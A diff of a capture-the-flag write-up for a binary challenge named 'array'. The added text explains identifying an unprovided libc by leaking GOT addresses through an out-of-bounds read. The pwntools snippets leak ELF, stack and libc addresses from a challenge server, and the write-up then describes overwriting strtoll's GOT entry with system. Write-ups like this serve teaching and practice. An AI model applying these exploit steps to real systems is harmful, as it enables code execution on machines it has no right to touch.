@@ -1,3 +1,4 @@
+The catch is this challenge is that we not given the libc. its part of the challenge to find the correct libc.
 As always, lets pop the binary into IDA:
 
 ```c
@@ -53,7 +54,6 @@ The following python code interacts with the binary:
 
 ```py
 elf = ELF("array")
-libc = ELF("libc.so.6") #after libc search and pwninit
 
 p = remote('34.124.157.94' , 10546)
 def read_buf(idx):
@@ -114,8 +114,19 @@ elf.address = read_buf(-1) - 0x11f5
 stack = read_buf(-7)
 buffer_addr = stack - 0x320
 ```
-now after we gain arbitrary read, its rivial to leak libc.
-We just read the one of the got function and substract their offset:
+Now we need to find the libc version.
+In order to find it, we can use a tool like `https://libc.blukat.me/`.
+You basiclly give it a few libc functions you leaked, and it will find the correct libc.
+I wrote this script to extract the libc, and then put it in the website:
+```py
+libc_leaks = ['puts', '__libc_start_main']
+for func in libc_leaks:
+       print(func, '-' + hex(arb_read(elf.got[func])))
+```
+![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/3f89b4f5-ea94-4a85-9c28-5a889c9657a5)
+
+we found the libc.
+Now we just read the one of the got function and substract their offset:
 `libc.address = arb_read(elf.got['puts']) - libc.sym.puts`
 
 now we can just do a got-overwrite with our arbitrary write, and replace strtoll with system. (strtoll will be called with our input in RDI, which is the parameter for system)
